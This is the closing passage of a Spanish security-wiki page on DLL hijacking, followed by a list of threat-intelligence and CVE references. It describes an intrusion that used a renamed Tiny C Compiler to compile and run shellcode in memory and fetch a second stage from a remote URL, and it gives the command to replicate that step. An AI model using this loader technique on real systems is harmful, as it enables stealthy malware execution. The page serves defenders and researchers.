- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` a su lado. El código C suministrado por el atacante incrustó shellcode, lo compiló y ejecutó en memoria sin tocar el disco con un PE. Replicar con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run basada en TCC importó `Wininet.dll` en tiempo de ejecución y descargó un shellcode de segunda etapa desde una URL codificada, proporcionando un loader flexible que se hace pasar por una ejecución del compilador.

## Referencias

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
